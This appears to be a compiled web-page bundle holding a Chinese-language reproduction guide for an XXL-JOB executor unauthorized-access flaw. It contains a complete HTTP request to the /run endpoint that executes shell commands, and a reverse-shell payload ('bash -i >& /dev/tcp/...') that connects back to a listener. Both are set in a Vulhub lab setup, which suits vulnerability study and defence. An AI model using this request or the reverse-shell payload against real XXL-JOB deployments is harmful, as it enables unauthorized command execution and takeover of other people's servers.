import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as r,c as s,a as e,b as n,d as i,e as a}from"./app-58e4a7d6.js";const d={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=e("p",null,"XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。XXL-JOB分为admin和executor两端，前者为后台管理页面，后者是任务执行的客户端。executor默认没有配置认证，未授权的攻击者可以通过RESTful API执行任意命令。",-1),p=e("p",null,"参考链接：",-1),m={href:"https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g",target:"_blank",rel:"noopener noreferrer"},b={href:"https://landgrey.me/blog/18/",target:"_blank",rel:"noopener noreferrer"},h={href:"https://github.com/OneSourceCat/XxlJob-Hessian-RCE",target:"_blank",rel:"noopener noreferrer"},v=a(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动2.2.0版本的XXL-JOB：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看到管理端（admin），访问<code>http://your-ip:9999</code>可以查看到客户端（executor）。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>向客户端（executor）发送如下数据包，即可执行命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /run HTTP/1.1
Host: your-ip:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 365

{
  &quot;jobId&quot;: 1,
  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,
  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,
  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,
  &quot;executorTimeout&quot;: 0,
  &quot;logId&quot;: 1,
  &quot;logDateTime&quot;: 1586629003729,
  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,
  &quot;glueSource&quot;: &quot;touch /tmp/awesome_poc&quot;,
  &quot;glueUpdatetime&quot;: 1586699003758,
  &quot;broadcastIndex&quot;: 0,
  &quot;broadcastTotal&quot;: 0
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022327467.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><code>touch /tmp/awesome_poc</code>已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022328972.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,10),g={href:"https://github.com/OneSourceCat/XxlJob-Hessian-RCE",target:"_blank",rel:"noopener noreferrer"},_=a(`<h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>发送数据包，执行反弹shell命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;glueSource&quot;: &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/2333 0&gt;&amp;1 &quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022329606.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>监听2333端口，接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022329112.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,6);function x(q,f){const t=l("ExternalLinkIcon");return r(),s("div",null,[c,u,p,e("ul",null,[e("li",null,[e("a",m,[n("https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g"),i(t)])]),e("li",null,[e("a",b,[n("https://landgrey.me/blog/18/"),i(t)])]),e("li",null,[e("a",h,[n("https://github.com/OneSourceCat/XxlJob-Hessian-RCE"),i(t)])])]),v,e("p",null,[n("另外，低于2.2.0版本的XXL-JOB没有RESTful API，我们可以通过"),e("a",g,[n("Hessian反序列化"),i(t)]),n("来执行命令。")]),_])}const E=o(d,[["render",x],["__file","XXL-JOB executor 未授权访问漏洞.html.vue"]]);export{E as default};
